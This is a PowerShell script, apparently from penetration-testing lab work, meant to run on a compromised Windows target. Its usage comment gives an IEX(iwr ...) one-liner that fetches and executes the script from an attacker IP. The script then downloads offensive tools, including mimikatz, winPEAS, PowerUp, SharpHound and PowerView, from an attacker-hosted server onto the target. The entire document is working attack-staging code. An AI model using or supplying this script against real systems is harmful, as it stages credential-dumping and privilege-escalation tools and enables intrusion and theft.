# This script is to be used from another machine.
# Allows downloading multiple files at once
# On the attacker, make sure to have the files on the current directory
# Change the $baseurl variable and $fileNames as intended
# Usage on target: 
## On PowerShell -> IEX(iwr -uri http://192.168.45.164/multi-download.ps1 -usebasicparsing) (optional -Path "C:\path\to\directory"))

param (
    [Parameter(Mandatory=$false)]
    [string]$Path
)

$baseurl = "http://10.10.14.37/"
$fileNames = @("mimikatz.exe", "winPEASany.exe","PowerUp.ps1", "SharpHound.exe", "SauronEye.exe", "PowerView.ps1")

# If no path is provided, set the path to the current directory
if (-not $Path) {
    $downloadPath = Get-Location
} else {
    $downloadPath = $Path
}

foreach ($fileName in $fileNames)
{
    $url = $baseurl + $fileName
    $filePath = Join-Path $downloadPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Write-Output "Downloaded $fileName to $filePath"
}

Write-Output "Happy Hacking!"